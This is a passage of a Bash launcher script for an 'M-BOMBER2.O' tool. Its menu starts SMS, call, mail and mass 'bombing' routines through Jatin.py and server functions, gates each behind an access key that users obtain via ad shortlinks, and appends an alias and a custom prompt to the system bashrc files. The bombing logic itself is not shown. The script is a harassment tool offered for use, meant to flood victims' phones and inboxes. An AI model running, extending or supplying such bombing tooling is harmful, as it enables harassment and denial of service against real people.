echo -e "\e[92m[\e[91m5\e[92m]\e[93m Mail Bombing\e[93m"
echo -e "\e[92m[\e[91m6\e[92m]\e[93m Whatsapp\e[93m"
echo -e "\e[92m[\e[91m7\e[92m]\e[93m Access Key\e[93m"
echo -e "\e[92m[\e[91m8\e[92m]\e[93m Back\e[93m"
echo -e "\e[92m[\e[91m0\e[92m]\e[93m Exit\e[93m"
 read ch
    cd Core
    clear
    if [ $ch -eq 1 ];then
    anonmen
    exit
    
elif [ $ch -eq 2 ];then
        clear
ban
figlet M-BOMBER2.O | lolcat
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50 
echo -e "\e[93m"
read  -p "ACCESS KEY: " access
cd $HOME/m-bomber2.O/Additional
bas=$(cat er3.txt)
if [[ $access = $bas ]];
then
clear
  if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'MASS BOMBER' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  MASS BOMBER | lolcat
        echo 'Created by The Jatin Kalwar' | lolcat
        fi
        massserver
else
echo " "
echo -e "               \e[34m =============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m    |"
echo -e "               \e[34m |                           |"
echo -e "               \e[34m |    Use shortlink for key  |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/eNHUCl7\e[34m |"
echo -e "               \e[34m |            [OR]           |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m |"
echo -e "               \e[34m =============================\e[34m"
echo " "
fi
sleep 5.0
bombs

    elif [ $ch -eq 8 ]; then
    clear
    banner 
    jat
    elif [ $ch -eq 3 ];then
        clear
ban
figlet M-BOMBER2.O | lolcat
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
echo -e "\e[93m"
read  -p "ACCESS KEY: " access
cd $HOME/m-bomber2.O/Additional
bas=$(cat er3.txt)
if [[ $access = $bas ]];
then
clear

        if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'SMS BOMBER' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  Sms bomber | lolcat
echo 'Created by The Jatin Kalwar' | lolcat
        fi
        cd $HOME/m-bomber2.O
        $PYTHON Jatin.py --sms
     else
echo " "
echo -e "               \e[34m =============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m    |"
echo -e "               \e[34m |                           |"
echo -e "               \e[34m |    Use shortlink for key  |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/eNHUCl7\e[34m |"
echo -e "               \e[34m |            [OR]           |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m |"
echo -e "               \e[34m =============================\e[34m"
echo " "
fi
sleep 5.0
bombs
    elif [ $ch -eq 4 ];then
        clear
     
ban
figlet M-BOMBER2.O | lolcat
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
echo -e "\e[93m"
read -p "ACCESS KEY: " access
cd $HOME/m-bomber2.O/Additional

bks=$(cat er3.txt)
if [[ $access = $bks ]];
then 
clear
callserver
     else
echo " "
echo -e "               \e[34m =============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m    |"
echo -e "               \e[34m |                           |"
echo -e "               \e[34m |    Use shortlink for key  |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/eNHUCl7\e[34m |"
echo -e "               \e[34m |            [OR]           |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m |"
echo -e "               \e[34m =============================\e[34m"
echo " "
fi
sleep 5.0
bombs
            elif [ $ch -eq 5 ];then
        clear
ban
figlet M-BOMBER2.O | lolcat
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50
echo -e "\e[93m"
read  -p "ACCESS KEY: " access
cd $HOME/m-bomber2.O/Additional
bts=$(cat er3.txt)
if [[ $access = $bts ]];
then
clear

        if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'MAIL BOMBER' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  Mail bomber | lolcat  
echo 'Created by The Jatin Kalwar' | lolcat
        fi
        cd $HOME/m-bomber2.O
        $PYTHON Jatin.py --mail
             else
echo " "
echo -e "               \e[34m =============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m    |"
echo -e "               \e[34m |                           |"
echo -e "               \e[34m |    Use shortlink for key  |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/eNHUCl7\e[34m |"
echo -e "               \e[34m |            [OR]           |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m |"
echo -e "               \e[34m =============================\e[34m"
echo " "
fi
sleep 5.0
bombs

elif [ $ch -eq 7 ];then
am start -a android.intent.action.VIEW -d https://gplinks.co/eNHUCl7 > /dev/null 2>&1
bombs

elif [ $ch -eq 6 ];then
        clear
ban
figlet M-BOMBER2.O | lolcat
echo -e "\e[31mPLEASE ENTER ACCESS KEY IF YOU DON'T HAVE ACCESS KEY THEN GO TO MAIN MENU AND CHOOSE OPTION 2 FOR ACCESS KEY" | pv -qL 50 
echo -e "\e[93m"
read  -p "ACCESS KEY: " access
cd $HOME/m-bomber2.O/Additional
bas=$(cat er3.txt)
if [[ $access = $bas ]];
then
clear
  if [[ "$OSTYPE" == "linux-gnu" ]]; then
        toilet -f ivrit 'WHATSAPP' | boxes -d cat -a hc -p h8 | lolcat
        else
        ban
        figlet  WHATSAPP | lolcat
        echo 'Created by The Jatin Kalwar' | lolcat
        fi
        echo -e  "WE ARE WORKING ON IT. WE WILL UPDATE IT SOON...THANK YOU\e[93m"
        sleep 5.0
bombs
else
echo " "
echo -e "               \e[34m =============================\e[34m"
echo -e "               \e[34m |     \e[93mOOPS WRONG KEY...!\e[34m    |"
echo -e "               \e[34m |                           |"
echo -e "               \e[34m |    Use shortlink for key  |"
echo -e "               \e[34m |\e[92mhttps://gplinks.co/eNHUCl7\e[34m |"
echo -e "               \e[34m |            [OR]           |"
echo -e "               \e[34m |\e[92m    https://bit.ly/3AeiAuD\e[34m |"
echo -e "               \e[34m =============================\e[34m"
echo " "
fi
sleep 5.0
bombs

 elif [ $ch -eq 0 ];then
        ban
        figlet Exit | lolcat
        echo ' BYEEEEEE............ ' | lolcat
        exit
    else
        echo -e "\e[4;32m Invalid Input !!! \e[0m"
        pause
    fi
   exit
   }

   
          
                        set_alias(){
    if [ "$distro" == "termux" ]; then
        cd;cd ..;cd usr;cd etc
	if grep -q "bomb" bash.bashrc; then
	    echo "Found...Skipping"
	    sleep 2
	    clear
               else    
	    echo 'alias bomb="cd;cd scripts;cd Social-Attacks;cd Master-Bomber;bash Master-Bomber.sh";' >> bash.bashrc
	    echo 'clear' >> bash.bashrc
	    echo 'PS1="\033[1;91mRoot[\033[1;93m\W\033[1;91m]:-\033[1;36m"' >> bash.bashrc
	    alias bomb="cd;cd scripts;cd Social-Attacks;cd Master-Bomber;bash Master-Bomber.sh";
	    clear
        fi
    else      
                                        if grep -q "bomb" /root/.bashrc; then
	    echo "Found...Skipping"
	    sleep 2
	    clear
	else
            echo ' ' >> /root/.bashrc
	    echo 'alias bomb="cd;cd scripts;cd Social-Attacks;cd Master-Bomber;bash Master-Bomber.sh";' >> /root/.bashrc
	    alias bomb="cd;cd scripts;cd Social-Attacks;cd Master-Bomber;bash Master-Bomber.sh";
        fi	    
    fi
}

internet

                                    ban
detect_distro
init_environ
if [ -f .update ];then
    echo "All Requirements Found...."
else
    echo 'Installing Requirements....'
    echo .
    echo .
    install_deps
    echo 'This Script Was Made By Jatin Kalwar' > .update
    echo 'Requirements Installed....'
    set_alias
fi
BLUE="$(printf '\e[34m')"

CYAN="$(printf '\e[36m')"

serveron() {
cd $HOME/m-bomber2.O/Additional
serverup="On"
server=$(cat .server.txt)
rm .server.txt 
if [[ $server = $serverup ]]
then
echo ""
else
clear
echo "              $BLUE ╭━━━┳━━━┳━━━┳━━━┳━━━╮ ╭╮╱╭┳━━━┳╮╱╭╮"
echo "              $CYAN ┃╭━━┫╭━╮┃╭━╮┃╭━╮┃╭━╮┃ ┃┃╱┃┃╭━╮┃┃╱┃┃"
echo "              $BLUE ┃╰━━┫╰━╯┃╰━╯┃┃╱┃┃╰━╯┃ ┃╰━╯┃┃┃┃┃╰━╯┃"
echo "              $CYAN ┃╭━━┫╭╮╭┫╭╮╭┫┃╱┃┃╭╮╭╯ ╰━━╮┃┃┃┃┣━━╮┃"
echo "              $BLUE ┃╰━━┫┃┃╰┫┃┃╰┫╰━╯┃┃┃╰╮ ╱╱╱┃┃╰━╯┃╱╱┃┃"
echo "              $CYAN ╰━━━┻╯╰━┻╯╰━┻━━━┻╯╰━╯ ╱╱╱╰┻━━━╯╱╱╰╯"
echo ""
echo ""
sleep 2
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Sorry for the inconvenience :(" | pv -qL 30
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[36m The Server is under maintenance !!" | pv -qL 20
echo ""
echo -e "      \e[92m[\e[33m~\e[92m]\e[0m Contact the developer Jatin Kalwar !" | pv -qL 30
echo ""
exit
exit
exit
fi
    
    
}
clear
upda
clear
serveron
clear
banner
cake

